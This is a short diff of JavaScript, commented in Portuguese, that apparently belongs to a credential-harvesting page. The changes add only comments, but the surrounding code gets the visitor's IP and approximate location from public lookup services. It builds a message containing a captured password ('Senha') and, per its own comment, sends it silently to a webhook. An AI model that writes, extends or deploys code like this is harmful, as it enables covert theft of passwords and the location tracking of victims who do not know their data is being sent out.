@@ -288,6 +288,7 @@
       let location = 'Desconhecido';
 
       try {
+        // Primeira tentativa: ipapi.co (suporta IPv6 bem)
         let res = await fetch('https://ipapi.co/json/');
         let data = await res.json();
         if (data.ip) {
@@ -297,7 +298,7 @@
           }
         }
       } catch (err) {
-        // Fallback
+        // Fallback: ipwhois.io
         try {
           let res2 = await fetch('https://ipwhois.io/api');
           let data2 = await res2.json();
@@ -318,6 +319,7 @@ Senha:
 \`${senha}\`
 
 🌐 IP Capturado: ${ip}
+
 📍 Localização aproximada: ${location}`;
 
       // Envia pro webhook silenciosamente
